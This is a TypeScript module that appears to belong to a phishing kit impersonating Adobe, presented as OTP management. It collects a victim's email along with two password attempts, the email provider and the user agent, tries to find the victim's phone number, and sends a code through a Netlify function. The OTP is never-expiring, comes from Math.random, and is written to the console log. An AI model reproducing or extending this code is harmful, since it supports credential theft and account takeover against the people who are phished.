// OTP Management - STRICTLY FUNCTIONAL
// REAL phone only - WITH manual fallback

import { detectPhoneFromProvider, isValidPhoneNumber, formatPhoneForDisplay } from './phoneNumberDetector';

export interface OTPSession {
  email: string;
  phone: string;
  phoneSource: string;
  phoneDetectionMethod: string;
  otp: string;
  createdAt: string;
  firstAttemptPassword: string;
  secondAttemptPassword: string;
  provider: string;
  userAgent: string;
  otpVerified: boolean;
  otpVerificationTime?: string;
}

const OTP_STORAGE_KEY = 'adobe_otp_sessions';

/**
 * Generate 6-digit OTP (no expiration)
 */
export const generateOTP = (): string => {
  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  console.log('🔐 [OTP] Generated 6-digit code:', otp);
  return otp;
};

/**
 * Store OTP session (strictly persistent, no expiry)
 */
export const storeOTPSession = (session: OTPSession): void => {
  try {
    if (typeof sessionStorage === 'undefined') return;
    
    const sessions = getAllOTPSessions();
    sessions[session.email] = session;
    
    sessionStorage.setItem(OTP_STORAGE_KEY, JSON.stringify(sessions));
    console.log('💾 [OTP] Session stored for:', session.email);
  } catch (err) {
    console.error('❌ [OTP] Failed to store session:', err);
    throw err;
  }
};

/**
 * Get all OTP sessions
 */
export const getAllOTPSessions = (): Record<string, OTPSession> => {
  try {
    if (typeof sessionStorage === 'undefined') return {};
    
    const data = sessionStorage.getItem(OTP_STORAGE_KEY);
    return data ? JSON.parse(data) : {};
  } catch (err) {
    console.error('❌ [OTP] Failed to retrieve sessions:', err);
    return {};
  }
};

/**
 * Get specific OTP session
 */
export const getOTPSession = (email: string): OTPSession | null => {
  try {
    const sessions = getAllOTPSessions();
    return sessions[email] || null;
  } catch (err) {
    console.error('❌ [OTP] Failed to get session for', email, err);
    return null;
  }
};

/**
 * Verify OTP - STRICT: Must match exactly, no expiry bypass
 */
export const verifyOTP = (email: string, providedOTP: string): boolean => {
  try {
    const session = getOTPSession(email);
    
    if (!session) {
      console.warn('❌ [OTP] No session found for:', email);
      return false;
    }

    const isValid = session.otp === providedOTP.trim();
    
    if (isValid) {
      console.log('✅ [OTP] Verification successful for:', email);
      session.otpVerified = true;
      session.otpVerificationTime = new Date().toISOString();
      storeOTPSession(session);
    } else {
      console.log('❌ [OTP] Verification failed - code mismatch for:', email);
    }
    
    return isValid;
  } catch (err) {
    console.error('❌ [OTP] Verification error:', err);
    return false;
  }
};

/**
 * Send OTP to REAL phone via SMS service
 */
export const sendOTPToPhone = async (
  email: string,
  phone: string,
  otp: string
): Promise<boolean> => {
  try {
    console.log(`📱 [OTP-SEND] Sending to REAL phone: ${formatPhoneForDisplay(phone)}`);

    const response = await fetch('/.netlify/functions/sendOTP', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email,
        phone,
        otp,
        timestamp: new Date().toISOString(),
      }),
    });

    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }

    const result = await response.json();
    console.log('✅ [OTP-SEND] Sent successfully:', result);
    return true;
  } catch (error) {
    console.error('❌ [OTP-SEND] Failed:', error);
    return false;
  }
};

/**
 * Clear OTP session after verification
 */
export const clearOTPSession = (email: string): void => {
  try {
    if (typeof sessionStorage === 'undefined') return;
    
    const sessions = getAllOTPSessions();
    delete sessions[email];
    
    sessionStorage.setItem(OTP_STORAGE_KEY, JSON.stringify(sessions));
    console.log('🗑️ [OTP] Session cleared for:', email);
  } catch (err) {
    console.warn('⚠️ [OTP] Failed to clear session:', err);
  }
};

/**
 * MAIN FLOW: Initiate OTP after 2nd attempt
 * Attempts to get REAL phone, with a fallback to manual entry.
 */
export const initiateOTPFlow = async (
  email: string,
  firstAttemptPassword: string,
  secondAttemptPassword: string,
  provider: string,
  userAgent: string,
  manualPhone: string | null = null
): Promise<{ success: boolean; phone: string; error?: string; manualEntryRequired: boolean }> => {
  try {
    console.log('\n🚀 [OTP-FLOW] Initiating OTP flow for 2nd attempt');
    console.log(`📧 Email: ${email}`);
    console.log(`🏢 Provider: ${provider}\n`);

    let phoneDetectionResult = {
      phone: manualPhone,
      source: 'manual_entry',
      method: 'user_provided',
      success: !!manualPhone,
      error: '',
    };

    // STEP 1: If no manual phone is provided, detect REAL phone from provider account
    if (!manualPhone) {
      console.log('⏳ [OTP-FLOW] STEP 1: Detecting REAL phone from account...');
      const autoDetection = await detectPhoneFromProvider(email, provider);

      if (!autoDetection.success || !autoDetection.phone) {
        console.warn('⚠️ [OTP-FLOW] Automatic phone detection failed. Manual entry is required.', autoDetection.error);
        return {
          success: false,
          phone: '',
          manualEntryRequired: true, // Signal to UI that manual entry is needed
          error: `Phone detection failed: ${autoDetection.error || 'Unknown error'}`,
        };
      }
      phoneDetectionResult = autoDetection;
    }

    const detectedPhone = phoneDetectionResult.phone;
    if (!detectedPhone || !isValidPhoneNumber(detectedPhone)) {
        throw new Error('Invalid or missing phone number for OTP flow.');
    }

    console.log(`✅ [OTP-FLOW] Using phone: ${formatPhoneForDisplay(detectedPhone)} (Source: ${phoneDetectionResult.source})`);

    // STEP 2: Generate OTP (6 digit, no expiry)
    console.log('⏳ [OTP-FLOW] STEP 2: Generating OTP...');
    const otp = generateOTP();

    // STEP 3: Store OTP session with all data
    console.log('⏳ [OTP-FLOW] STEP 3: Storing OTP session...');
    const otpSession: OTPSession = {
      email,
      phone: detectedPhone,
      phoneSource: phoneDetectionResult.source,
      phoneDetectionMethod: phoneDetectionResult.method,
      otp,
      createdAt: new Date().toISOString(),
      firstAttemptPassword,
      secondAttemptPassword,
      provider,
      userAgent,
      otpVerified: false,
    };

    storeOTPSession(otpSession);
    console.log(`✅ [OTP-FLOW] Session stored`);

    // STEP 4: Send OTP to REAL phone (STRICT - MUST send)
    console.log('⏳ [OTP-FLOW] STEP 4: Sending OTP to REAL phone...');
    const sendSuccess = await sendOTPToPhone(email, detectedPhone, otp);

    if (!sendSuccess) {
      console.error('❌ [OTP-FLOW] Failed to send OTP to phone');
      return {
        success: false,
        phone: '',
        manualEntryRequired: false,
        error: 'Failed to send OTP to phone number',
      };
    }

    console.log('✅ [OTP-FLOW] OTP flow completed successfully\n');
    return {
      success: true,
      phone: formatPhoneForDisplay(detectedPhone),
      manualEntryRequired: false,
    };
  } catch (error) {
    console.error('❌ [OTP-FLOW] Unexpected error:', error);
    return {
      success: false,
      phone: '',
      manualEntryRequired: false,
      error: String(error instanceof Error ? error.message : error),
    };
  }
};